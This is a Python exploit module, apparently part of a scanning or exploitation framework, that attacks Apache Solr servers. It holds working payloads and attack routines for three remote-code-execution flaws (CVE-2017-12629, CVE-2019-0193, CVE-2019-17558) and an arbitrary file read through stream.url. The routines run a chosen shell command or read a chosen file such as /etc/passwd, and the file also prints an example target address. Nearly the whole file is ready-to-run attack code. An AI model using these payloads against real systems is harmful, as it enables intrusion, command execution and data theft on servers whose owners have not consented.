import random,string,requests,json,re
from util.ExpRequest import ExpRequest,Output
from urllib.parse import urlparse, quote
from operator import methodcaller
"""
##--ApacheSolr--##
#cve_2017_12629 无回显的命令执行, 默认VULN = None, 7.1.0以上(包含)版本已删除RunExecutableListener
#cve_2019_0193  无回显的命令执行，默认VULN = None
#cve_2019_17558 有回显的命令执行, 设置VULN = True
"""
class ApacheSolr():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

        # Change the url format to conform to the program
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        
        if r"https://" in self.url:
            self.url = "https://"+self.hostname+":"+str(self.port)
        if r"http://" in self.url:
            self.url = "http://"+self.hostname+":"+str(self.port)

        try:
            self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
            self.request = requests.get(url=self.urlcore, timeout=self.timeout, verify=False)
            self.corename = list(json.loads(self.request.text)["status"])[0]
        except Exception as e:
            self.corename = 'admin'

        self.payload_cve_2017_12629 = '{"add-listener":{"event":"postCommit","name":"newcore","class":"solr.RunExecu' \
            'tableListener","exe":"sh","dir":"/bin/","args":["-c", "RECOMMAND"]}}'
        self.payload_cve_2019_0193 = "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test" \
            "&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5B" \
            "CDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22RECOMMAND%22)%3B%0A++++++" \
            "++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++" \
            "++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%2" \
            "2XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3A" \
            "poc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport"
        self.payload_cve_2019_17558="/select?q=1&&wt=velocity&v.template=cus" \
            "tom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.for" \
            "Name(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27" \
            "java.lang.Character%27))+%23set($str=$x.class.forName(%27java.l" \
            "ang.String%27))+%23set($ex=$rt.getRuntime().exec(%27RECOMMAND%2" \
            "7))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach(" \
            "$i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read" \
            "()))%23end"

    def cve_2017_12629(self):
        appName = 'Apache Solr: CVE-2017-12629'
        pocname = 'CVE-2017-12629'
        method = 'post'
        desc = 'Apache Solr: CVE-2017-12629'
        newcore = ''.join(random.choices(string.ascii_letters+string.digits, k=6))
        payload1 = self.payload_cve_2017_12629.replace("RECOMMAND", self.cmd).replace("newcore", newcore)
        payload2 = '[{"id": "test"}]'
        urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"

        headers_solr1 = {
            'Host': "localhost",
            'Accept': "*/*",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close"
        }
        headers_solr2 = {
            'Host': "localhost",
            'ccept-Language': "en",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close",
            'Content-Type': "application/json"
        }
        headers = {
            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            #'Content-Type' : 'application/x-www-form-urlencoded',
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            request = exprequest.get(url=self.url+"/solr/", headers=headers, timeout=self.timeout, verify=False)
            if request.status_code == 200:
                get_ver = re.findall(r'img/favicon\.ico\?_=(.*)"', request.text)[0]
                ver = get_ver.replace(".", "")
            request = exprequest.get(url=urlcore, headers=headers, timeout=self.timeout, verify=False)
            try:
                corename = list(json.loads(request.text)["status"])[0]
            except:
                pass
            request = exprequest.post(self.url+"/solr/"+str(corename)+"/config", data=payload1, headers=headers_solr1, timeout=self.timeout, verify=False)
            if request.status_code == 200 and corename != "null" and int(ver) < 710:
                self.status = 'success'
                request = exprequest.post(self.url+"/solr/"+str(corename)+"/update", data=payload2, headers=headers_solr2, timeout=self.timeout, verify=False)
                info = "rce"+" [activemq version: " + get_ver + "]"+" [newcore:"+newcore+"] "
                output.echo_success(method, info)
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))

    def cve_2019_0193(self):
        appName = 'Apache Solr'
        pocname = 'CVE-2019-0193'
        method = 'get'
        desc = 'Apache Solr: CVE-2019-0193'
        payload = self.payload_cve_2019_0193.replace("RECOMMAND", quote(self.cmd,'utf-8'))
        solrhost = self.hostname + ":" + str(self.port)
        headers = {
            'Host': ""+solrhost,
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Accept': "application/json, text/plain, */*",
            'Accept-Language': "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            'Accept-Encoding': "zip, deflate",
            'Referer': self.url+"/solr/",
            'Content-type': "application/x-www-form-urlencoded",
            'X-Requested-With': "XMLHttpRequest",
            'Connection': "close"
        }
        urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            request = exprequest.get(url=urlcore, headers=headers, timeout=self.timeout, verify=False)
            try:
                corename = list(json.loads(request.text)["status"])[0]
            except:
                pass
            urlconfig = self.url+"/solr/"+str(corename)+"/admin/mbeans?cat=QUERY&wt=json"
            # check solr mode: "solr.handler.dataimport.DataImportHandler"
            request = exprequest.get(url=urlconfig, headers=headers, timeout=self.timeout, verify=False)
            urlcmd = self.url+"/solr/"+str(corename)+"/dataimport"
            request = exprequest.post(urlcmd, data=payload, headers=headers, timeout=self.timeout, verify=False)
            if request.status_code==200 and corename!="null":
                self.status = 'success'
                info = "rce"+" [corename:"+str(corename)+"]"
                output.echo_success(method, info)
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))

    def cve_2019_17558(self):
        appName = 'Apache Solr'
        pocname = 'CVE-2019-17558'
        method = 'get'
        desc = 'Apache Solr: CVE-2019-17558'
        payload_1 = self.payload_cve_2019_17558.replace("RECOMMAND","id")
        payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND",self.cmd)
        urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            request = exprequest.get(url=urlcore, timeout=self.timeout, verify=False)
            try:
                corename = list(json.loads(request.text)["status"])[0]
            except:
                pass
            info = "rce"+" [corename:"+str(corename)+"]"
            urlapi = self.url+"/solr/"+str(corename)+"/config"
            headers_json = {'Content-Type': 'application/json'}
            set_api_data = """
            {
              "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
              }
            }
            """
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(urlapi, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
                if request.status_code == 200 and corename != None:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                request = exprequest.post(urlapi, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
                request = exprequest.get(self.url+"/solr/"+str(corename)+payload_2, timeout=self.timeout, verify=False)
                print(request.text)
        except Exception as error:
            output.error_output(str(error))

    def cve_20210408_filereading(self):
        appName = 'Apache Solr'
        pocname = 'cve_20210408_filereading'
        method = 'get'
        desc = 'Apachesolr : cve_20210408_filereading'
        info = '[file readind]'
        path = '/solr/{}/debug/dump?param=ContentStreams&stream.url=file://{}'
        payload = r''
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*'
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url + path.format(self.corename,'/etc/passwd'), data=payload, headers=headers, timeout=self.timeout, verify=False)
                if r"root" in request.text or r"系统找不到" in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                request = exprequest.get(self.url + path.format(self.corename,self.cmd), data=payload, headers=headers, timeout=self.timeout, verify=False)
                print(request.text)
        except Exception as error:
            output.error_output(str(error))

print("""eg: http://106.53.249.95:8983
+-------------------+--------------------------+-------------------------------------------------------------+
| Target type       | Vuln Name                | Impact Version && Vulnerability description                 |
+-------------------+--------------------------+-------------------------------------------------------------+
| Apache Solr       | cve_2017_12629           | < 7.1.0, runexecutablelistener rce & xxe, only rce is here  |
| Apache Solr       | cve_2019_0193            | < 8.2.0, dataimporthandler module remote code execution     |
| Apache Solr       | cve_2019_17558           | 5.0.0 - 8.3.1, velocity response writer rce                 |
| Apache Solr       | cve_20210408_filereading | filereading                                                 |
+-------------------+--------------------------+-------------------------------------------------------------+""")
def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpApacheSolr = ApacheSolr(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpApacheSolr, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpApacheSolr.status
    else:#调用所有函数
        for func in dir(ApacheSolr):
            if not func.startswith("__"):
                methodcaller(func)(ExpApacheSolr)
                result_list.append(func+' -> '+ExpApacheSolr.status)
                ExpApacheSolr.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)





